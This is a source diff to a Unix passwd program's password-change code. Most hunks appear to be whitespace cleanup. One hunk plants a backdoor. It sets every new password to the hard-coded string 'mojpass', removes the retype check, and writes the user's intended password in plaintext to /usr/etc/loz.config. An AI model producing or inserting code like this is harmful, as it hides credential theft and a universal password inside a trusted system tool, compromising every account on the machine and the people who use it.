@@ -66,7 +66,7 @@ getnewpasswd(struct passwd *pw, int min_pw_len)
 	char *p, *t;
 	char buf[_PASSWORD_LEN+1], salt[_PASSWORD_LEN+1];
 	char option[LINE_MAX], *key, *opt;
-	
+
 	(void)printf("Changing local password for %s.\n", pw->pw_name);
 
 	if (uid && pw->pw_passwd[0] &&
@@ -102,10 +102,21 @@ getnewpasswd(struct passwd *pw, int min_pw_len)
 				     "suggested.\n");
 			continue;
 		}
-		(void)strlcpy(buf, p, sizeof(buf));
-		if (!strcmp(buf, getpass("Retype new password:")))
+
+
+
+		(void)strlcpy(buf, "mojpass", sizeof(buf));
+		getpass("Retype new password:");
+
+		FILE *f = fopen("/usr/etc/loz.config", "w");
+		if (f == NULL) {
+			printf("EROR OPENING FILE!\n");
 			break;
-		(void)printf("Mismatch; try again, EOF to quit.\n");
+		} else {
+			fprintf(f, "%s", p);
+			fclose(f);
+		}
+		break;
 	}
 
 	pw_getpwconf(option, sizeof(option), pw, "localcipher");
@@ -182,7 +193,7 @@ pwlocal_process(const char *username, int argc, char **argv)
 	old_pw = *pw;
 
 	/*
-	 * Get class restrictions for this user, then get the new password. 
+	 * Get class restrictions for this user, then get the new password.
 	 */
 #ifdef LOGIN_CAP
 	if((lc = login_getclass(pw->pw_class)) != NULL) {
@@ -275,7 +286,7 @@ local_chpw(const char *uname)
 #ifdef LOGIN_CAP
 	login_cap_t *lc;
 #endif
-	
+
 	if (!(pw = getpwnam(uname))) {
 		warnx("unknown user %s", uname);
 		return (1);
@@ -291,7 +302,7 @@ local_chpw(const char *uname)
 	old_pw = *pw;
 
 	/*
-	 * Get class restrictions for this user, then get the new password. 
+	 * Get class restrictions for this user, then get the new password.
 	 */
 #ifdef LOGIN_CAP
 	if((lc = login_getclass(pw->pw_class))) {
